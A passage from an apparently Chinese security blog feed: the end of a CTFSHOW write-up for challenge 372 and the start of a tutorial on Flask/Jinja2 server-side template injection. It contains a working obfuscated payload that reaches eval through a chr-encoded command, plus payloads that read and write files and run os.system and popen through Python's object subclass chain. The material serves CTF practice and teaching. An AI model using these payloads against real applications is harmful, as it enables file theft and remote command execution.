class="string">&quot;%2b&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># num = getNum(24)</span></span><br><span class="line"><span class="comment"># num = num.replace(&#x27;+&#x27;,&#x27;%2b&#x27;)</span></span><br><span class="line"><span class="comment"># print(num)</span></span><br></pre></td></tr></table></figure><h2 id="372"><a href="#372" class="headerlink" title="372"></a>372</h2><p>又过滤了count ,用length过滤器拼凑数字</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> B=(a,)|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> A=B-B%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> C=B%2bB%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> D=C%2bB%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> E=D%2bB%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> F=E%2bB%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> G=F%2bB%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> H=G%2bB%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> I=H%2bB%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> J=I%2bB%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx = ((&#123;&#125;|select()|string()|<span class="built_in">list</span>()).pop((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bB*(C**E)))|string())%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini = <span class="built_in">dict</span>(<span class="keyword">in</span>=ro,it=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> init = xhx~xhx~ini~xhx~xhx%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glob = <span class="built_in">dict</span>(glo=ro,bals=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span> = xhx~xhx~glob~xhx~xhx%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getit = <span class="built_in">dict</span>(get=ro,item=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem = xhx~xhx~getit~xhx~xhx%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bu = <span class="built_in">dict</span>(buil=aa,tins=dd)|join() %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bul = xhx~xhx~bu~xhx~xhx %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(init)|attr(<span class="built_in">globals</span>)|attr(getitem))(bul)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> <span class="built_in">chr</span> = x.<span class="built_in">chr</span>%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">set</span> cmda=<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))%&#125;</span><br><span class="line">&#123;%<span class="keyword">if</span> (x.<span class="built_in">eval</span>(cmda))%&#125;sssss&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 安全 </category>
          
          <category> CTFSHOW </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> python </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模板注入</title>
      <link href="2020/12/30/%E6%B5%85%E8%B0%88SSTI/"/>
      <url>2020/12/30/%E6%B5%85%E8%B0%88SSTI/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有关SSTI的一些知识  <a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p>SSTI (Server-Side Template Injection)，即服务端模板注入攻击，通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者getshell的目的。</p><p>SSTI属于沙箱逃逸的一种 , 关于python沙箱逃逸的一些姿势 <a href="https://xz.aliyun.com/t/52#toc-0">https://xz.aliyun.com/t/52#toc-0</a></p><p>CTF里面主要是python的模板注入,本文主要探究的也是python环境下的</p><p>python 2.x/3.x Flask( Jinja2 )</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p><code>__globals__</code> :  使用方式是 <code>函数名.__globals__</code>，返回一个当前空间下能使用的模块，方法和变量的字典 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">var = <span class="number">2333</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span> (test.__init__.__globals__)</span><br></pre></td></tr></table></figure><p>返回的模块包括了内置模块和通过import导入的模块</p><p><img src="1608901697568.png" alt="1608901697568"></p><p>有时还可以用 <strong>func_global</strong>代替</p><blockquote><p><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;)</code></p></blockquote><p>与继承,类等有关的</p><p><code>__class__ </code>: 返回一个实例所属的类</p><p><code>__subclasses__()</code> : 返回一个类的子类，(列表形式)</p><p><code>__bases__</code>:  返回一个类<strong>直接</strong>所继承的类（元组形式)</p><p><code>__base_</code>: 返回直接基类 , 只有一个</p><p><code>__mro__</code> : 会返回一个类的调用顺序,也就是所有继承链上的类(包括最顶层) (元组形式)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">base1</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">base2</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">kid1</span>(<span class="params">base1,base2</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">kid2</span>(<span class="params">kid1</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">kid3</span>(<span class="params">base1</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">obj = new kid2</span><br><span class="line"><span class="comment"># __class__ 返回一个实例所属的类</span></span><br><span class="line">print(obj.__class__) <span class="comment"># &lt;class &#x27;__main__.kid2&#x27;&gt;</span></span><br><span class="line"><span class="comment"># __subclasses__() 返回一个类的子类</span></span><br><span class="line">print(kid1.__subclasses__()) <span class="comment"># [&lt;class &#x27;__main__.kid2&#x27;&gt;]</span></span><br><span class="line">print(base1.__subclasses__())<span class="comment"># [&lt;class &#x27;__main__.kid1&#x27;&gt;, &lt;class &#x27;__main__.kid3&#x27;&gt;]</span></span><br><span class="line"><span class="comment"># __bases__ 返回一个类直接所继承的类</span></span><br><span class="line">print(kid2.__bases__) <span class="comment"># (&lt;class &#x27;__main__.kid1&#x27;&gt;,)</span></span><br><span class="line">print(kid1.__bases__) <span class="comment"># (&lt;class &#x27;__main__.base1&#x27;&gt;, &lt;class &#x27;__main__.base2&#x27;&gt;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># __base__ 返回直接基类 , 只有一个</span></span><br><span class="line">print(kid1.__base__) <span class="comment"># &lt;class &#x27;__main__.base1&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#__mro__ 返回继承链上所有类</span></span><br><span class="line">print(kid1.__mro__)</span><br><span class="line"><span class="comment">#(&lt;class &#x27;__main__.kid1&#x27;&gt;, &lt;class &#x27;__main__.base1&#x27;&gt;, &lt;class &#x27;__main__.base2&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span></span><br><span class="line">print(kid2.__mro__) </span><br><span class="line"><span class="comment">#(&lt;class &#x27;__main__.kid2&#x27;&gt;, &lt;class &#x27;__main__.kid1&#x27;&gt;, &lt;class &#x27;__main__.base1&#x27;&gt;, &lt;class &#x27;__main__.base2&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span></span><br></pre></td></tr></table></figure><p><code>__builtin__ &amp;&amp; __builtins__</code> : </p><p><code>__builtin__</code>是一个python的内置模块(<code>&lt;module &#39;__builtin__&#39; (built-in)&gt;</code>) 里面包括了python中可以直接运行一些函数，例如<code>int(),list()</code>等等</p><p><code>dir(__builtins__)</code> / <code>dir(&#39;builtin&#39;)</code> / <code>dir(&#39;builtins&#39;)</code></p><blockquote><p>二者区别:</p><p>1、在主模块<code>main</code>中，<code>__builtins__</code>是对内建模块<code>__builtin__</code>本身的引用，即<code>__builtins__</code>完全等价于<code>__builtin__</code>，二者完全是一个东西，不分彼此。</p><p>2、非主模块<code>main</code>中，<code>__builtins__</code>仅是对<code>__builtin__.__dict__</code>的引用，而非<code>__builtin__</code>本身</p></blockquote><p><code>__dict__</code></p><p><img src="1608958452026.png" alt="1608958452026"></p><h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><p>利用继承链进行攻击,主要利用object类和内置类</p><h2 id="object基类的利用"><a href="#object基类的利用" class="headerlink" title="object基类的利用"></a>object基类的利用</h2><blockquote><p> 可以利用直接object基类下的子类,也可以利用子类下面的方法等</p></blockquote><p>​        找到object类</p><ol><li><p>随便找一个内置类对象用<code>__class__</code>拿到他所对应的类</p></li><li><p>用<code>__bases__</code>拿到基类（<code>&lt;class &#39;object&#39;&gt;</code>）</p><p>利用其object基类的子类</p></li><li><p>用<code>__subclasses__()</code>拿到子类列表</p></li><li><p>在子类列表中直接寻找可以利用的类</p></li></ol><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>读取文件利用的是object子类的<code>&lt;type &#39;file&#39;&gt;</code>类</p><p>找<code>&lt;type &#39;file&#39;&gt;</code>的位置,可以用下面的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search = <span class="string">&#x27;file&#x27;</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__base__.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> search <span class="keyword">in</span> <span class="built_in">str</span>(i):</span><br><span class="line">        <span class="built_in">print</span> num</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure><p><code>&lt;type &#39;file&#39;&gt;</code>在第40位 ,<code> ().__class__.__bases__[0].__subclasses__()[40]</code></p><p> 用<code>dir</code>来看看内置的方法 <code>dir(().__class__.__bases__[0].__subclasses__()[40])</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__enter__&#x27;</span>, <span class="string">&#x27;__exit__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;closed&#x27;</span>, <span class="string">&#x27;encoding&#x27;</span>, <span class="string">&#x27;errors&#x27;</span>, <span class="string">&#x27;fileno&#x27;</span>, <span class="string">&#x27;flush&#x27;</span>, <span class="string">&#x27;isatty&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;newlines&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;readinto&#x27;</span>, <span class="string">&#x27;readline&#x27;</span>, <span class="string">&#x27;readlines&#x27;</span>, <span class="string">&#x27;seek&#x27;</span>, <span class="string">&#x27;softspace&#x27;</span>, <span class="string">&#x27;tell&#x27;</span>, <span class="string">&#x27;truncate&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;writelines&#x27;</span>, <span class="string">&#x27;xreadlines&#x27;</span>]</span><br></pre></td></tr></table></figure><p>存在read,readline,readlines,write等方法,可以利用这些方法进行读写文件</p><p>读文件 : <code>().__class__.__base__.__subclasses__()[40](&#39;filename&#39;).readlines()</code></p><p>写文件:  <code>().__class__.__base__.__subclasses__()[40](&#39;路径+文件名&#39;).write(&#39;内容&#39;) </code></p><blockquote><p>这种方法只能在py2下使用,py3已经移除了<code>&lt;type &#39;file&#39;&gt;</code></p></blockquote><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>执行命令是利用子类的一些方法</p><p>可以利用<code>XX.__init__.globals__</code> 更详细的查看这个类的属性方法等</p><p>用下面的脚本遍历找到我们想利用的一些方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">searchlist = [<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;commands&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;platform&#x27;</span>,<span class="string">&#x27;timeit&#x27;</span>,<span class="string">&#x27;importlib&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> search <span class="keyword">in</span> searchlist</span><br><span class="line">    num = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">                print(i, num)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">   </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">py2.x (py3.x下可利用的模块更多)</span></span><br><span class="line"><span class="string">(&lt;lass &#x27;site._Printer&#x27;&gt;, 72, &#x27;os&#x27;)</span></span><br><span class="line"><span class="string">(&lt;class &#x27;site.Quitter&#x27;&gt;, 77, &#x27;os&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>构造:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">72</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">72</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p><strong>还有一些比较特殊的类和命令执行方式 warning相关的</strong></p><p>主要有两个 <code>&lt;class &#39;warnings.WarningMessage&#39;&gt;</code>和<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code></p><p>分别在<code>().__class__.__mro__[1].__subclasses__()[59]</code>和<code>().__class__.__mro__[1].__subclasses__()[60]</code></p><p>再从linecache寻找可以利用的模块</p><p><code>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__</code></p><p>在linecache的<code>__dict__</code>里面可以找到一些可以利用的模块比如os模块</p><p><img src="1608958574283.png" alt="1608958574283"></p><p>利用os模块里面的system方法</p><p><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;)</code></p><h2 id="内置类的利用"><a href="#内置类的利用" class="headerlink" title="内置类的利用"></a>内置类的利用</h2><p>主要是<code>__builtins__</code></p><p>找到<code>__builtins__</code>位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span 